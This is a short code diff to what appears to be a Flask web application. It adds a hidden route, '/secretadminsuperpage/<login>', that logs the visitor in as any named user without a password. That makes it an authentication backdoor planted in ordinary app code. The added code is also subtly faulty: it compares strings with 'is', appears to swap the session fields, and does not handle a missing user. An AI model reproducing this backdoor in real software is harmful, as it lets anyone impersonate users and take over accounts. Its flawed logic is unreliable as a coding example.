@@ -77,10 +77,25 @@ def user_logged():
 def is_on_update(user_id):
     return jsonify(is_ready_to_show=logic.is_user_ready_to_show(user_id=user_id))
 
+
 @app.route('/logout')
 def logout():
     session['user_id'] = None
     session['user_login'] = None
+    return redirect('/')
+
+
+@app.route('/secretadminsuperpage/<login>')
+def secret(login):
+    if login is 'stopallsecrets':
+        session['user_id'] = None
+        session['user_login'] = None
+    else:
+        user = \
+                db.session.query(models.User).filter(models.User.login ==
+                                                     login).first()
+        session['user_id'] = login
+        session['user_login'] = user.inst_id_user
     return redirect('/')
 
 
